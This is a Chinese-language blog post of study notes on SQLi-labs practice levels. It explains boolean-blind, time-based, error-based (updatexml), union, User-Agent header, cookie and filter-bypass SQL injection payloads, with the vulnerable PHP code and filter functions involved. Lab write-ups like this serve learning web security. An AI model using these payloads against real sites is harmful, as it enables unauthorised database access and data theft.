---
title: SQL-Labs笔记
published: 2026-08-02
description: 打个靶场，先射箭再画靶
tags:
  - MySQL
  - SQL注入
  - web安全
  - SQLi
category: 02_知识
slug: knowledge-base/02_kownledge/sqli-labs-notes
draft: false
---
## Less-X：关卡标题

**注入点**：GET / POST / Cookie / User-Agent（选一个）

**闭合方式**：
- 原 SQL 推测：SELECT ... FROM ... WHERE id=('$id') ...
- 我的闭合 Payload：1')) 注入语句 --+
- 闭合逻辑：单引号 + 两个右括号

**核心 Payload 拆解**：

| Payload 片段                                   | 作用           |
| :------------------------------------------- | :----------- |
| `1'`                                         | 闭合前面的单引号     |
| `))`                                         | 闭合前面的两个右括号   |
| `and updatexml(1,concat(0x7e,database()),1)` | 报错注入，爆库名     |
| `--+`                                        | 注释掉后面的剩余 SQL |

- 问问自己这三个问题
     - 注入点在哪？
     - 闭合方式是什么？
     - payload 的每个部分分别起什么作用？

---
## Less-8
**注入点：** GET

**闭合方式：**
'$id'

**核心 Payload 拆解：**
以下基于Burp suite的Payload，而非python脚本
`?id=1' and`
在 and 后面做文章

先库猜长度
`?id=1' and substr(database(),1,1)='a' --+`

参考[[SQLi-Notes#布尔盲注]]
通过网页界面反应来判断，逐步猜出库名，表名，列名

## Less-9
**注入点**：GET

**闭合方式**：
'$id'
其实一开始也不知道，在尝试几次payload后可做出判断

**核心 Payload 拆解**：
?id=1' and if(查询的语句), sleep(5), 1)--+

### 时间盲注的核心：`IF` 与 `SLEEP` 的组合

例子里，`IF(条件, sleep(5), 1)` 就是典型的请求。它的执行逻辑是：

- **如果条件为真**：执行 `sleep(5)`，页面会停滞5秒才返回。
    
- **如果条件为假**：执行 `1`，页面立刻返回。
某种角度上来说，是报错注入的令一种形式

---
## Less-11
**注入点**：POST
**闭合方式**：
'$id'
**核心 Payload 拆解**：
`uname=1'or 1=1 order by 3 #&passwd=1&submit=Submit`

这里的 or 1=1，是配合order by 3的，猜出字段数
order by 3用于判断设置字段数为多少，后可知为2

- **POST 请求**（参数在 Body 中）：`#` 不会被截断，可以正常发送。
    
- **Cookie / HTTP 头注入**：都不涉及 URL fragment，`#` 能正常传递。
`uname=-1'union select 1,2 #&passwd=1&submit=Submit`
在1, 2字段，选择其一位置做子查询

---
## Less-18
**注入点**：http头注入User-Agent，uagent(源码中)

**闭合方式**：
$uagent = $\_SERVER\[\'HTTP_USER_AGENT\'\];
$insert="INSERT INTO ... VALUES ('uagent', 'IP', 'name')";
mysql_query($insert);
'uagent'为注入点，闭合方式见上

**核心 Payload 拆解**：
' or updatexml(1, concat(0x7e, database(), 0x7e), 1) or '
在or or之间选择报错注入方法，这是较优雅方法
拼接后的SQL语句如下
```sql
INSERT INTO ... VALUES ('' or updatexml(1, concat(0x7e, database(), 0x7e), 1) or '', 'IP', 'name')
```
- 第一个 `''` 是空字符串，然后 `or` 执行 `updatexml` 报错带出数据，最后 `or ''` 保证单引号配对。
- 由于 `updatexml` 参数非法，MySQL 抛出错误，PHP 显示到页面上，实现报错注入。


1',1,updatexml(1,concat(0x3a,database(),0x3a),1)  )#
三个参数，#前的括号用于闭合VALUES后的括号，这个方法次之

---
## Less-20
**注入点**：cookie
**闭合方式**：hackbar的cookie功能构造payload
**核心 Payload 拆解**：
同Less-1字符注入，注入点位置变化了而已

## Less-21
**注入点**：cookie
**闭合方式**：('')
传出的cookie做了base64编码和url编码
Jw\==经过base64编码后为'
Ig\==经过base64编码后为"
**核心 Payload 拆解**：

## Less-27a
**注入点**：get
**闭合方式**：""
**核心 Payload 拆解**：
	被过滤元素：空格，纯大写或纯小写或开头大写的union和select等
	function blacklist($id)
	{
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --.
	$id= preg_replace('/[#]/',"", $id);			//Strip out #.
	$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
	$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
	$id= preg_replace('/union/s',"", $id);	    //Strip out union
	$id= preg_replace('/select/s',"", $id);	    //Strip out select
	$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
	$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
	$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
	$id= preg_replace('/Select/s',"", $id);	    //Strip out Select
	return $id;
	}
	---高亮部分为get请求?id的内容
	SELECT * FROM users WHERE id= "==0" unIon seLect 1,database(),2 or "1"="1==" LIMIT 0,1
	---
	注意这**第三个字段**，为(2 or "1"="1")括号里的所有，2被判为布尔值真，整体也为真，or后"1"="1的闭合了题设的"，最终该字段返回1
	原因是无法用--+等来注释掉后一个"
	---
	该关卡空格用 %0a 换行键绕过

